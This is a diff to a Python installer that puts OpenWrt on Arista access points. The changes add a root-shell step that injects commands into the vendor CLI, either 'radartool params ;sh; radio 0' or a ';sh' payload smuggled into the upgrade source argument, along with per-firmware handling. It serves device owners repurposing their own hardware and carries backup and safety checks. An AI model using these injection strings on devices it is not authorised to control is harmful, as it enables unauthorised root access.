@@ -9,8 +9,8 @@ The rule this tool is built around: an AP in the wild may be the only copy of
 its own firmware.  So it always downloads the AP's flash first, verifies every
 byte of it, and only then offers to change anything.
 
-    1. Connect to the AP on its factory firmware (SSH as config, then
-       prep_upgrade.sh's eval gives a root shell; nothing is written by this).
+    1. Connect to the AP on its factory firmware (SSH as config, then a root
+       shell out of the CLI's radartool; nothing is written by this).
     2. Verify the AP: model, firmware version, flash layout, U-Boot variables
        the fallback needs.  Refuses to go on if anything is unexpected.
     3. Download all of its flash over SSH (gzip, streamed to this PC, never
@@ -65,7 +65,16 @@ INDEX = "index.json"
 #        now waits for whichever leading prompt shows up first and drives
 #        the rest from that, instead of assuming 11.x's order (2026-11-04,
 #        from a hand-run transcript on a C-260, build 16.1.0-51.6).
-TOOL_VERSION = "1.2"
+#   1.3  16.x's "Upgrade from Server/Host []" is an *echo* of the source, not
+#        a prompt: nothing reads a host there, so a payload typed at it
+#        answers Continue? and starts an upgrade from nothing.  A root shell
+#        now comes from radartool instead -- 'radartool params ;sh; radio 0'
+#        evals its arguments, dropping to BusyBox ash (proven on a C-260 on
+#        16.1.0-51.6 and a C-360 on 8.9/11.x, and documented for firmware 18
+#        by Arista-AP-firmware).  The upgrade wizard remains only as a
+#        fallback, its 16.x/18.x source now passed as 'upgrade url <url>' and
+#        believed only when the echo line shows our host (2026-11-04).
+TOOL_VERSION = "1.3"
 
 # ---------------------------------------------------------------------------
 # Helpers carried in this file on purpose: a field installer has to be ONE
@@ -899,6 +908,142 @@ def connect(host, user=None, password=None):
             m.say("  trying again.")
 
 
+CONTINUE_PAT = r"Continue\?\s*\(?\[y\]/n\)?"
+CONFIRM_PAT = r"Confirm\?\s*\(?\[y\]/n\)?"
+SERVER_PAT = r"Server IP Address or Upgrade path"
+SOURCE_ECHO_PAT = r"Upgrade from Server/Host \[([^\]]*)\]"
+SHELL_PAT = r"\[config\]\$"
+
+
+def root_via_radartool(pty):
+    """A root shell out of the config CLI's radartool command.
+
+    The CLI passes radartool's arguments to a shell unquoted, so
+    'radartool params ;sh; radio 0' runs 'sh' after the tool -- a BusyBox ash
+    as root.  Proven on a C-260 on 16.1.0-51.6 (2026-11-04), captured on a
+    C-360 on the older firmware (2026-10-05), and documented for firmware 18
+    by Arista-AP-firmware.  The ash banner is the proof the break-out worked,
+    so nothing else is typed unless it appears.  Returns True with the pty
+    sitting at the ash prompt, False with the config shell still on top.
+    """
+    say("  asking radartool for a shell (its arguments are evaluated).")
+    mk = pty.mark()
+    pty.send("radartool params ;sh; radio 0")
+    if not pty.wait(r"built-in shell \(ash\)", 30, mark=mk):
+        return False
+    mk2 = pty.mark()
+    pty.send("id")
+    if not pty.wait(r"uid=0", 10, mark=mk2):
+        return False
+    say("  root shell via radartool.")
+    return True
+
+
+def upgrade_root_shell(pty, host, payload):
+    """Drive Arista's own 'upgrade' until it hands back a shell, or stop.
+
+    The way in is the download command prep_upgrade.sh builds and evals.  The
+    two firmware families ask for it in different places, and 16.x's wording
+    looks like 11.x's while behaving the opposite way:
+
+    11.x / 8.9 (proven on C-230 and C-260 hardware): Continue?, then "Enter
+        upgrade build version string", "Enter upgrade build vendor version",
+        then a genuine "Server IP Address or Upgrade path [x]:" prompt that
+        reads a line -- the payload goes there -- then "Confirm?".
+
+    16.x / 18.x (C-260, build 16.1.0-51.6, read on hardware 2026-11-04; and
+        Arista-AP-firmware's notes for 18): 'upgrade' prints
+        "Upgrade from Server/Host []" -- the source it is about to use, empty
+        -- and goes straight on to "Continue? [y]/n:" without reading a host.
+        Anything typed at that line is read as the answer to Continue?, which
+        the AP takes as "not n, so continue": the upgrade starts from no
+        source, the session dies, and no shell appears.  The source is given
+        on the command line instead -- 'upgrade url <url>' -- and a bare
+        "upgrade <url>" is rejected ("Invalid argument <url>"): the first
+        positional argument is not the url.
+
+    So on 16.x/18.x the source is passed as 'upgrade url <url>', and the echo
+    line is what proves it was taken: an empty [] means it was not, and "y" is
+    not sent on a source that is not ours.  Nothing is typed at the source
+    line until staying silent has shown that nothing is reading it.
+    """
+    mk = pty.mark()
+    pty.send("upgrade")
+    first = pty.wait(r"(?:%s)|(?:%s)|(?:%s)" % (SERVER_PAT, SOURCE_ECHO_PAT, CONTINUE_PAT),
+                     30, mark=mk)
+    if not first:
+        die("'upgrade' offered neither Continue?, a server prompt, nor a source "
+            "line: offline mode, or a build this tool has not been read on.\n%s"
+            % pty.since(mk).strip()[-600:])
+
+    if "Upgrade from Server/Host" not in first.group(0):
+        # ---- 11.x: the wizard that is proven on hardware ----------------
+        pty.send("y")
+        for sub_pat in (r"Enter upgrade build version string",
+                        r"Enter upgrade build vendor version"):
+            mks = pty.mark()
+            if pty.wait(sub_pat, 30, mark=mks):
+                pty.send("1")
+        if not pty.wait(SERVER_PAT, 30):
+            die("the upgrade flow did not ask for a server address the usual way;\n"
+                "run 'upgrade' by hand once and send the full prompt sequence so the\n"
+                "tool can be matched to this build.")
+        pty.send(payload)
+        # Confirm? follows the server address on 11.x; only answer it if it comes.
+        if pty.wait(CONFIRM_PAT, 90):
+            pty.send("y")
+        return
+
+    # ---- 16.x: is that source line a prompt, or an echo? ----------------
+    # Nothing in the wording says, and guessing wrong answers Continue? with the
+    # payload.  Stay silent first: if Continue? is already up, or turns up on
+    # its own, nothing was reading the line.
+    waiting = (not re.search(CONTINUE_PAT, pty.since(mk))
+               and pty.wait(CONTINUE_PAT, 6) is None)
+    if waiting:
+        # A build that echoes the source and then waits for one anyway.
+        pty.send(payload)
+        if not pty.wait(CONTINUE_PAT, 30):
+            die("no Continue? after the upgrade source:\n%s"
+                % pty.since(mk).strip()[-600:])
+        pty.send("y")
+        return
+
+    # The source line was an echo and Continue? is up.  Decline it -- nothing
+    # has started yet -- and give the source the way this CLI takes it, as
+    # 'upgrade url <source>'.
+    pty.send("n")
+    if not pty.wait(SHELL_PAT, 20):
+        die("'n' at Continue? did not return to the config shell:\n%s"
+            % pty.since(mk).strip()[-600:])
+    line = "upgrade url %s" % payload
+    say("  This build echoes the upgrade source instead of reading one, so it is")
+    say("  passed as 'upgrade url <source>'; the echo line has to show this host")
+    say("  before Continue? is answered.")
+    mk2 = pty.mark()
+    pty.send(line)
+    got = pty.wait(r"(?:%s)|(?:Invalid argument)|(?:%s)"
+                   % (CONTINUE_PAT, SHELL_PAT), 30, mark=mk2)
+    text = pty.since(mk2)
+    if not got:
+        die("'%s' was not answered within 30 s:\n%s" % (line, text.strip()[-600:]))
+    if "Invalid argument" in text:
+        die("this build's 'upgrade' rejected that argument shape:\n%s\n"
+            "Nothing was written.  Run 'upgrade ?' (or 'help upgrade') and send\n"
+            "what it lists, so the tool can be matched to this build.\n%s"
+            % (line, text.strip()[-600:]))
+    if re.search(CONTINUE_PAT, text):
+        mm = re.search(SOURCE_ECHO_PAT, text)
+        src = (mm.group(1) if mm else "").strip()
+        if host in src:
+            pty.send("y")
+            return
+        die("'%s' reached Continue? but the source is still '%s' -- it was not\n"
+            "taken, so Continue? was left unanswered.  Nothing was written.\n%s"
+            % (line, src, text.strip()[-600:]))
+    die("'%s' was answered unexpectedly:\n%s" % (line, text.strip()[-600:]))
+
+
 def _connect_once(host, user=None, password=None):
     """Returns (kind, pty_or_conn, card).  kind is 'stock' or 'openwrt'.
 
@@ -975,58 +1120,31 @@ def _connect_once(host, user=None, password=None):
             fw = mm.group(1).strip()
             break
     m.say("  This AP is an Arista %s, firmware %s." % (MODELS[model]["name"], fw or "?"))
-    pty.send("upgrade")
-    # The prompt order differs by build, not just its punctuation: 11.x asks
-    # "Continue?" first, then (on some builds) two build-version sub-prompts,
-    # then the server address ("Server IP Address or Upgrade path"), then a
-    # final "Confirm?".  16.x asks the server address first -- worded
-    # "Upgrade from Server/Host []" -- then "Continue?", with no sub-prompts
-    # and no separate "Confirm?" after it (read from a hand-run transcript on
-    # a C-260, build 16.1.0-51.6, 2026-11-04).  Wait for whichever of the two
-    # leading prompts shows up first and drive the rest from there.
-    server_pat = r"(?:Server IP Address or Upgrade path|Upgrade from Server/Host)"
-    continue_pat = r"Continue\?\s*\(?\[y\]/n\)?"
-    confirm_pat = r"Confirm\?\s*\(?\[y\]/n\)?"
     payload = "http://%s/;sh</dev/tty>/dev/tty;" % host
-    mk1 = pty.mark()
-    first = pty.wait("(?:%s)|(?:%s)" % (server_pat, continue_pat), 30, mark=mk1)
-    if not first:
-        m.die("'upgrade' offered neither a server prompt nor Continue?: offline mode, or another build.")
-    if re.search(server_pat, first.group(0)):
-        # 16.x order: the server/host field is asked before Continue?.
-        pty.send(payload)
-        if not pty.wait(continue_pat, 30):
-            m.die("no Continue? prompt after the server address:\n%s" % pty.since(0).strip()[-800:])
-        pty.send("y")
-    else:
-        # 11.x order: Continue? first, then the optional build sub-prompts,
-        # then the server address.
-        pty.send("y")
-        for sub_pat in (r"Enter upgrade build version string",
-                        r"Enter upgrade build vendor version"):
-            mk2 = pty.mark()
-            if pty.wait(sub_pat, 30, mark=mk2):
-                pty.send("1")
-        if not pty.wait(server_pat, 30):
-            m.die("the upgrade flow did not ask for a server address the usual way;\n"
-                  "run 'upgrade' by hand once and send the full prompt sequence so the\n"
-                  "tool can be matched to this build.")
-        pty.send(payload)
-    # Confirm? follows the server address on 11.x; 16.x has none observed, so
-    # this is optional -- only answer it if it actually appears.
-    mk3 = pty.mark()
-    if pty.wait(confirm_pat, 90, mark=mk3):
-        pty.send("y")
-    time.sleep(10)
-    out, rc = pty.run("id", 120)
-    if "uid=0" not in out:
-        # Drop the session: that is what makes Arista's helper give up and
-        # restart the AP, which is the only way out of this state without hands.
-        try:
-            client.close()
-        except Exception:
-            pass
-        raise ShellNotReady(out[-300:] or "(no output)")
+    if not root_via_radartool(pty):
+        # radartool is the clean way in; where a build lacks it (or has it
+        # patched), fall back to Arista's own upgrade wizard, which is the
+        # path proven on the C-230 and C-260 at 11.x and the 'upgrade url'
+        # argument form on 16.x/18.x.
+        mk0 = pty.mark()
+        upgrade_root_shell(pty, host, payload)
+        time.sleep(10)
+        said = pty.since(mk0)
+        if "Upgrade has started" in said:
+            m.die("Arista started an upgrade from a source it never read: the injected\n"
+                  "command did not run, so no root shell was handed back.  Nothing was\n"
+                  "written to this AP and it stays on its own firmware.  Reboot it and\n"
+                  "run again once this build's source argument is known.\n%s"
+                  % said.strip()[-600:])
+        out, rc = pty.run("id", 120)
+        if "uid=0" not in out:
+            # Drop the session: that is what makes Arista's helper give up and
+            # restart the AP, which is the only way out of this state without hands.
+            try:
+                client.close()
+            except Exception:
+                pass
+            raise ShellNotReady(out[-300:] or "(no output)")
     global _STOCK, _STOCK_HOST
     _STOCK = pty
     _STOCK_HOST = host
@@ -2244,14 +2362,15 @@ def main():
     THIS_RUN = run
     step("Connect to the AP",
          "Log in to %s and get a root shell without touching its flash or\n"
-         "environment (Arista's config shell, then prep_upgrade.sh's eval)." % a.host,
+         "environment (Arista's config shell, then its radartool's evaled args)."
+         % a.host,
          "The AP must be powered, on the network, and on its factory firmware.\n"
          "If it already runs OpenWrt, use --installer-at <its address> instead.\n"
-         "This uses Arista's own upgrade command, whose download path is evaled:\n"
-         "checked in both models' firmware (C-230 8.9.0-63.1, C-260 11.0.1-49).\n"
-         "C-230 its /tmp/offline file blocks that command, so clear offline mode.\n"
-         "If a unit's shell never offers 'Continue?', the console procedure in the\n"
-         "repository README is the way in, and this tool is not.")
+         "The root shell comes from 'radartool params ;sh; radio 0' (proven on\n"
+         "a C-260 at 16.1.0-51.6 and a C-360 at 8.9/11.x); where a build lacks\n"
+         "that, the tool falls back to Arista's own upgrade wizard.  If a unit's\n"
+         "shell offers neither, the console procedure in the repository README is\n"
+         "the way in, and this tool is not.")
     kind, shell, card = connect(a.host, a.user, a.password)
     if not field_install(card["model"]):
         refuse_unsupported(card["model"])
